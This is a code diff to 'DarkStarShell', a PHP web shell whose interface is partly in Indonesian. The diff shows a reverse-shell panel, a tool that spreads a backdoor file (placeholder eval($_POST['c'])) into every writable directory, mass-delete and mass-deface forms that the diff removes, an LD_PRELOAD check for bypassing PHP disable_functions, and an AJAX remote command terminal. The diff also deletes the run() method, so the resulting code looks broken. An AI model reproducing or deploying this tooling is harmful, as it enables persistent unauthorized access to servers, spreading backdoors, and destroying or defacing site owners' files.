                             <div class="col-md-4">
                                 <div class="card card-dark card-outline">
                                     <div class="card-header bg-danger"><h3 class="card-title"><i class="fas fa-undo-alt"></i> Reverse Shell</h3></div>
@@ -768,38 +996,11 @@ class DarkStarShell {
                                 <div class="card card-dark card-outline">
                                     <div class="card-header bg-success"><h3 class="card-title"><i class="fas fa-soap"></i> Sabun Biasa (File Spreader)</h3></div>
                                     <div class="card-body">
-                                        <p class="text-success">Menyebarkan satu file (`$namafile`) dan isinya ke direktori saat ini, parent (`..`), dan semua sub-direktori yang *writable*.</p>
+                                        <p class="text-success">Menyebarkan satu file (`$namafile`) dan isinya ke sub-direktori yang *writable*.</p>
                                         <form method="post" action="?do=sabun_biasa&path=<?php echo $path_encoded; ?>">
                                             <div class="form-group"><label>Nama File Target (e.g., `backdoor.php`)</label><input type="text" class="form-control bg-dark text-light" name="namafile" value="panel.php" required></div>
                                             <div class="form-group"><label>Isi Script / Code</label><textarea class="form-control bg-dark text-light" name="isi_script" rows="5" placeholder="<?php echo '<?php eval($_POST[\'c\']); ?>'; ?>" required></textarea></div>
                                             <button type="submit" class="btn btn-success btn-block" onclick="return confirm('WARNING: Are you sure you want to run Sabun Biasa?')">Execute Sabun Biasa</button>
-                                        </form>
-                                    </div>
-                                </div>
-                            </div>
-                            
-                            <div class="col-md-4">
-                                <div class="card card-dark card-outline">
-                                    <div class="card-header bg-danger"><h3 class="card-title"><i class="fas fa-bomb"></i> Mass Delete Tool</h3></div>
-                                    <div class="card-body">
-                                        <p class="text-danger">Delete files recursively (termasuk sub-folder) dari lokasi saat ini.</p>
-                                        <form method="post" action="?do=mass_delete&path=<?php echo $path_encoded; ?>&target=<?php echo $path_encoded; ?>">
-                                            <div class="form-group"><label>Path Awal</label><input type="text" class="form-control bg-dark text-light" value="<?php echo htmlspecialchars($this->path); ?>" readonly></div>
-                                            <div class="form-group"><label>File Pattern (e.g., `*.html`, `index.*`)</label><input type="text" class="form-control bg-dark text-light" name="pattern" value="*.html" required></div>
-                                            <button type="submit" class="btn btn-danger btn-block" onclick="return confirm('WARNING: Are you sure you want to MASS DELETE files?')">Execute Mass Delete</button>
-                                        </form>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-md-4">
-                                <div class="card card-dark card-outline">
-                                    <div class="card-header bg-warning"><h3 class="card-title"><i class="fas fa-code"></i> Mass Deface Tool</h3></div>
-                                    <div class="card-body">
-                                        <p class="text-warning">Injeksi konten ke banyak file secara rekursif.</p>
-                                        <form method="post" action="?do=mass_deface&path=<?php echo $path_encoded; ?>&target=<?php echo $path_encoded; ?>">
-                                            <div class="form-group"><label>File Pattern (e.g., `index.php`, `*.html`)</label><input type="text" class="form-control bg-dark text-light" name="pattern" value="*.html" required></div>
-                                            <div class="form-group"><label>Content / Deface Text</label><textarea class="form-control bg-dark text-light" name="content" rows="5" placeholder="<h1>Hacked By <?php echo $this->nick; ?></h1>" required></textarea></div>
-                                            <button type="submit" class="btn btn-warning btn-block" onclick="return confirm('WARNING: Are you sure you want to MASS DEFACE files?')">Execute Mass Deface</button>
                                         </form>
                                     </div>
                                 </div>
@@ -845,7 +1046,12 @@ class DarkStarShell {
                                         </table>
                                     </div>
                                     <div class="col-md-12 mt-3">
-                                        <h5 class="mb-3"><i class="fas fa-cogs text-danger"></i> Advanced PHP Info</h5>
+                                        <h5 class="mb-3"><i class="fas fa-code-branch text-warning"></i> Runtime Bypass Check (LD_PRELOAD)</h5>
+                                        <table class="table table-sm table-dark">
+                                            <tr><td>Fungsi `putenv()` Tersedia</td><td><?php echo function_exists('putenv') ? '<span class="text-success">Yes (Potential LD_PRELOAD Vector)</span>' : '<span class="text-danger">No</span>'; ?></td></tr>
+                                            <tr><td>Fungsi `dl()` Tersedia</td><td><?php echo function_exists('dl') ? '<span class="text-success">Yes (Potential Extension Load Vector)</span>' : '<span class="text-danger">No</span>'; ?></td></tr>
+                                        </table>
+                                        <p class="text-warning">Jika `putenv()` tersedia, server rentan terhadap teknik Environment Variable Injection seperti **LD_PRELOAD** untuk bypass `disable_functions`.</p>
                                         <a href="?do=phpinfo" target="_blank" class="btn btn-danger btn-block">View Full phpinfo() (New Tab)</a>
                                     </div>
                                 </div>
@@ -993,20 +1199,22 @@ function confirmBeforeClose() {
     } else { $('#editModal').modal('hide'); }
 }
 
-function executeCommand(form) {
-    const command = document.getElementById('commandInput').value;
-    const output = document.getElementById('terminalOutput');
+function executeAdvancedCommand(form) { // BARU: Advanced Terminal
+    const command = document.getElementById('commandInputAdvanced').value;
+    const method = document.getElementById('execMethod').value;
+    const target_func = document.getElementById('targetFunc').value;
+    const output = document.getElementById('terminalOutputAdvanced');
     const url = window.location.href.split('?')[0]; 
 
-    output.textContent += "\n$ " + command + "\n" + "-".repeat(80) + "\n" + "[Executing... Please wait]";
+    output.textContent += "\n$ ["+method+"] "+ command + "\n" + "-".repeat(80) + "\n" + "[Executing... Please wait]";
     output.scrollTop = output.scrollHeight;
     
-    document.getElementById('commandInput').value = '';
+    document.getElementById('commandInputAdvanced').value = '';
 
-    fetch(`${url}?do=terminal`, {
+    fetch(`${url}?do=advanced_exec`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams({ command: command, is_ajax: 1 })
+        body: new URLSearchParams({ command: command, method: method, target_func: target_func, is_ajax: 1 })
     })
     .then(response => response.text())
     .then(responseText => {
@@ -1026,11 +1234,12 @@ function executeCommand(form) {
 $(function () {
     // --- Tab Switching Logic ---
     const hash = window.location.hash;
+    
     // Check if the hash matches a nav link
     if (hash && $(`a[href="${hash}"]`).length) { 
         $(`a[href="${hash}"]`).tab('show'); 
     } else {
-        // If not, use the PHP logic to determine active tab (e.g., if find_grep_results is set)
+        // If not, use the PHP logic to determine active tab 
         $(`a[href="#<?php echo $active_tab; ?>"]`).tab('show');
     }
     
@@ -1052,17 +1261,8 @@ $(function () {
 </body>
 </html>
         <?php
-    }
-
-    public function run() {
-        if (ob_get_level() == 0) ob_start(); 
-        $this->authenticate();
-        $this->handleAjax(); 
-        $this->handlePostActions();
-        $this->renderHTML();
-        if (ob_get_level() > 0) ob_end_flush();
-    }
-}
+    } // Ini adalah penutup dari private function renderHTML()
+} // Ini adalah penutup dari class DarkStarShell
 
 // Instantiate and run the shell
 (new DarkStarShell())->run();
